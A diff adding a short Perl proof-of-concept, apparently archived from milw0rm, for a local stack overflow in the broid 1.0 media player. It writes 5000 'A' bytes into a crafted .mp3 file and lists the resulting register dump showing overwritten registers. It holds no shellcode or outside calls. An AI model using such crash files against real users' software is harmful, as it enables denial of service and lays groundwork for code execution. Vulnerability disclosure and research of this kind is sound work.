@@ -1,0 +1,24 @@
+#!/usr/bin/perl
+# Found By :: HACK4LOVE
+# broid 1.0 Beta 3a (.mp3 File) Local Stack Overflow PoC
+# http://s1.freedownloadsplace.com/download-soft1/broid-1.0-Beta-3a.zip
+########################################################################################
+##EAX 8C8C8C7D
+##ECX 41414141
+##EDX C3C3C3C3
+##EBX 00FE28B8 ASCII "C:\Documents and Settings\ahmed\Desktop\hack4love.mp3"
+##ESP 0012EF74
+##EBP 00FFE128
+##ESI 00001388
+##EDI 41414141
+##EIP 004784FF broidegn.004784FF
+#######################################################################################
+#Thanks*SimO-s0fT /\RAYO/\deco017/\mo7areb/\ELNAMER ELMASRY/\EL7ADRANY/\SKULL-HACKER
+# Stack/\His0k4/\ThE g0bL!N/\ZAX/\ASER ELRO7/\SAR7ABEL ELSAFA7
+########################################################################################
+my $crash="\x41" x 5000;
+open(myfile,'>>hack4love.mp3');
+print myfile $crash;
+########################################################################################
+
+# milw0rm.com [2009-08-18]
